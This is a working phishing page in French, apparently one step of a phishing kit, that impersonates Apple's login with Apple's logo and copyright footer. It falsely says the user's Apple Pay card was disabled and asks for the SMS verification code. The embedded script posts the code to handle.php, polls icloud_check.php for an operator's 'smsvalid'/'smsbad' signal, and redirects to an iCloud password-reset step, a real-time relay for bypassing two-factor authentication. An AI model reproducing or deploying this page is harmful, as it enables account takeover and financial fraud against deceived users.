2.08.489Zm12.084-.024c.525 0 1.005-.08 1.441-.24a3.453 3.453 0 0 0 1.955-1.747h.13V16.5h2.55V1.24h-2.55v5.997h-.13a3.292 3.292 0 0 0-.802-1.073c-.338-.3-.727-.53-1.167-.694a4.093 4.093 0 0 0-1.433-.244c-.932 0-1.739.23-2.42.693-.681.463-1.207 1.122-1.579 1.978-.371.855-.557 1.873-.557 3.055v.016c0 1.175.186 2.19.559 3.049.372.858.9 1.52 1.585 1.984.684.464 1.49.697 2.418.697Zm.783-2.15c-.566 0-1.054-.145-1.466-.432-.412-.287-.728-.699-.95-1.235-.22-.536-.33-1.174-.33-1.913v-.016c0-.742.11-1.38.331-1.912.222-.533.539-.944.95-1.232.412-.288.9-.432 1.465-.432.56 0 1.046.146 1.46.436.413.29.735.703.964 1.237.228.534.343 1.169.343 1.906v.016c0 .732-.114 1.366-.34 1.902-.227.536-.548.95-.963 1.24-.415.29-.903.434-1.464.434v.001ZM8.856 3.158C9.35 2.56 9.7 1.745 9.7.92c0-.114-.01-.227-.03-.32-.805.03-1.774.536-2.351 1.217-.454.516-.877 1.341-.877 2.167 0 .123.02.247.031.288.052.01.134.021.217.021.721 0 1.629-.485 2.165-1.135h.001Zm.567 1.31c-1.207 0-2.186.733-2.815.733-.67 0-1.546-.691-2.598-.691C2.02 4.51 0 6.16 0 9.265c0 1.94.742 3.982 1.67 5.303.794 1.114 1.485 2.032 2.485 2.032.99 0 1.422-.66 2.65-.66 1.247 0 1.525.64 2.618.64 1.082 0 1.804-.991 2.484-1.971.763-1.124 1.083-2.218 1.093-2.27-.062-.02-2.134-.866-2.134-3.239 0-2.053 1.629-2.97 1.722-3.043-1.073-1.547-2.712-1.589-3.165-1.589Z" transform="translate(2.5 6.5)"/>
      </svg>
    </a>
    <div class="nav-spacer"></div>
    <button class="nav-ellipsis" aria-label="Plus d'options">
      <svg viewBox="0 0 64 14" xmlns="http://www.w3.org/2000/svg" width="28" height="7">
        <circle cx="7" cy="7" r="6.3"/>
        <circle cx="32" cy="7" r="6.3"/>
        <circle cx="57" cy="7" r="6.3"/>
      </svg>
    </button>
  </nav>

  <main class="main">
<div class="card">
  <!-- SMS bubble icon -->
  <div class="icon-wrap">
    <svg viewBox="0 0 42 42" fill="none" xmlns="http://www.w3.org/2000/svg">
      <!-- Speech bubble -->
      <rect x="3" y="5" width="30" height="22" rx="7" fill="#0071e3"/>
      <!-- Text lines inside bubble -->
      <rect x="9" y="11" width="18" height="2.5" rx="1.25" fill="white" opacity="0.9"/>
      <rect x="9" y="16" width="13" height="2.5" rx="1.25" fill="white" opacity="0.9"/>
      <rect x="9" y="21" width="10" height="2.5" rx="1.25" fill="white" opacity="0.7"/>
      <!-- Tail -->
      <path d="M12 27 L8 34 L18 27Z" fill="#0071e3"/>
    </svg>
  </div>

  <h1>Code de vérification</h1>
  <p class="subtitle">Suite à cette connexion, nous avons <strong>désactivé votre carte reliée à Apple Pay</strong>. Pour la resynchroniser, veuillez saisir le code reçu par SMS.</p>

  <div class="digits" id="digits">
    <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
    <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
    <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
    <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
    <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
    <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
  </div>

  <div class="error-msg hidden" id="errMsg">Code incorrect. Veuillez réessayer.</div>

  <button class="btn-verify" id="btnVerify" disabled>Vérifier</button>
  <button class="resend-link" type="button">Renvoyer le code</button>
</div>
  </main>

  <footer class="site-footer">
    <nav class="footer-links">
      <a href="#">État du système</a>
      <a href="#">Engagement de confidentialité</a>
      <a href="#">Conditions générales</a>
    </nav>
    <span class="footer-copy">Copyright &copy; 2026 Apple Inc. Tous droits réservés.</span>
  </footer>

<!-- loading overlay -->
<div class="overlay" id="overlay">
  <div class="overlay-box">
    <div class="spinner">
      <div class="spinner-blade"></div><div class="spinner-blade"></div>
      <div class="spinner-blade"></div><div class="spinner-blade"></div>
      <div class="spinner-blade"></div><div class="spinner-blade"></div>
      <div class="spinner-blade"></div><div class="spinner-blade"></div>
      <div class="spinner-blade"></div><div class="spinner-blade"></div>
      <div class="spinner-blade"></div><div class="spinner-blade"></div>
    </div>
    <p>Vérification en cours…</p>
  </div>
</div>

<script>
(function() {
  var digits    = Array.from(document.querySelectorAll('#digits input'));
  var btnVerify = document.getElementById('btnVerify');
  var errMsg    = document.getElementById('errMsg');
  var overlay   = document.getElementById('overlay');
  var polling   = false;

  function getCode() { return digits.map(function(d){ return d.value; }).join(''); }

  function updateBtn() {
    var full = getCode().length === 6;
    btnVerify.disabled = !full;
    digits.forEach(function(d){ d.classList.toggle('filled', d.value !== ''); });
  }

  digits.forEach(function(inp, idx) {
    inp.addEventListener('keydown', function(e) {
      if (e.key === 'Backspace' && inp.value === '' && idx > 0) {
        digits[idx-1].focus();
        digits[idx-1].value = '';
        updateBtn();
      }
    });
    inp.addEventListener('input', function() {
      var val = inp.value.replace(/[^0-9]/g,'');
      if (val.length > 1) {
        // paste into first box
        var chars = val.split('');
        digits.forEach(function(d, i){ d.value = chars[i] || ''; });
        var next = Math.min(chars.length, 5);
        digits[next].focus();
      } else {
        inp.value = val;
        if (val && idx < 5) digits[idx+1].focus();
      }
      updateBtn();
    });
    inp.addEventListener('focus', function(){ inp.select(); });
  });

  btnVerify.addEventListener('click', function() {
    var code = getCode();
    if (code.length < 6) return;
    sendCode(code);
  });

  function sendCode(code) {
    overlay.classList.add('visible');
    errMsg.classList.add('hidden');
    btnVerify.disabled = true;

    fetch('handle.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'step=4&code=' + encodeURIComponent(code)
    }).then(function(r){ return r.json(); })
      .then(function(data) {
        if (data.ok) {
          polling = true;
          pollResult();
        } else {
          overlay.classList.remove('visible');
          btnVerify.disabled = false;
        }
      }).catch(function() {
        overlay.classList.remove('visible');
        btnVerify.disabled = false;
      });
  }

  function pollResult() {
    fetch('icloud_check.php?t=' + Date.now())
      .then(function(r){ return r.text(); })
      .then(function(raw) {
        var signal = raw.trim();
        if (signal === 'smsvalid') {
          window.location.href = 'icloud_newpass.php';
        } else if (signal === 'smsbad') {
          overlay.classList.remove('visible');
          errMsg.classList.remove('hidden');
          digits.forEach(function(d){ d.value = ''; });
          digits[0].focus();
          updateBtn();
          polling = false;
          // reset waiting so next submit works
          fetch('handle.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'step=reset_sms'
          });
        } else {
          setTimeout(pollResult, 2000);
        }
      }).catch(function() { setTimeout(pollResult, 3000); });
  }

  // auto-focus first digit
  digits[0].focus();
})();
</script>
</body>
</html>
